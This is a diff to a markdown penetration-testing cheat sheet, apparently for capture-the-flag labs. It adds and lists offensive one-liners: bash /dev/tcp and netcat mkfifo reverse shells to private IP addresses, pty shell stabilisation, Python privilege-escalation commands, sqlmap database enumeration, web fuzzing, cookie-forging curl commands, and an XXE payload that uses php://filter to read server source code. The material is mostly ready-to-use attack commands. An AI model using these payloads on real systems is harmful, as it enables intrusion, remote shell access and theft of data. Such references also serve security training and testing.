@@ -43,7 +43,8 @@
 
 - Using python
 
-```python3 -c 'import pty;pty.spawn("/bin/bash")'``` : ``pty`` python spawner (used for ``su``) \
+```python3 -c "import pty;pty.spawn('/bin/bash')"``` : ``pty`` python spawner (used for ``su``) \
+```export TERM=xterm``` : Stabilize shell \
 ```python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'``` : Python priv esc sniper
 
 - Using sudo
@@ -64,7 +65,7 @@
 
 - Using tcp/udp
 
-```/bin/bash -i > /dev/tcp/10.10.10.10/8000 0>&1 2>&1``` : ``tcp`` based reverse shell \
+```/bin/bash -c 'bash -i >& /dev/tcp/10.9.5.201/1234 0>&1'``` : ``tcp`` based reverse shell \
 ```rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.18.126.124 8000 >/tmp/f``` : ``tcp`` based reverse shell
 
 - Using python
@@ -82,7 +83,24 @@
 
 - Using ffuf
 
-```ffuf -u http://10.10.177.208 -w /usr/share/wordlists/dirb/big.txt``` : Fuzz web site with ffuf (require wordlist)
+```ffuf -u http://10.10.177.208 -w /usr/share/wordlists/dirb/big.txt``` : Fuzz web site with ffuf (require wordlist) \
+```wfuzz http://10.10.172.104/api/user\?FUZZ -w /usr/share/dirb/wordlists/``` : Fuzz web site with wfuzz (require wordlist)
+
+## ➰ Curl
+
+```curl -u username:password http://10.10.10.10.:8080/``` : Basic Auth \
+```curl -s -A "Mozilla/5.0 ..." http://10.10.202.138``` : Change user agent \
+```curl -s --referer "tute.com" http://10.10.202.138/url/``` : Change referer \
+```curl -v -d @file.xml http://10.10.10.10/user?xml``` : Upload file content with POST method \
+```curl -k http://test.com``` : Allow insecure connexions \
+```curl -X GET|POST http://test.com``` : Request web server \
+```curl -v --cacert /etc/pki/tls/certs/ca-bundle.crt https://test.com``` : Use specific key chain 
+
+- Cookie
+  
+```curl -s --cookie "Invited=1" http://10.10.202.138/``` : Overwrite cookie \
+```curl -v --cookie-jar cookies.txt --form username=user --form password=pwd http://10.10.202.138/login/``` : Save login session cookie \
+```curl -v -b cookies.txt http://10.10.202.138/login``` : Use previous saved cookie
 
 ## 👁️ Nmap
 
@@ -118,6 +136,17 @@ if (isset($_GET['language'])) {
 ```sqlmap -r r.txt --dbs``` : Enumarate database \
 ```sqlmap -r r.txt --dbs --batch -D db_name --tables``` : Enumerate db tables \
 ```sqlmap -r t.txt --dbs --batch -D db_name --tables -T table_name --columns -C field_name --sql-query 'select field_name from table_name'``` : Query fields
+
+## XXE
+
+- Bootstrap xml code to retrieve php source code over base64 encoded string
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]>
+<data>
+  <id>&xxe;</id>
+</data>
+```
 
 ## XSS
 
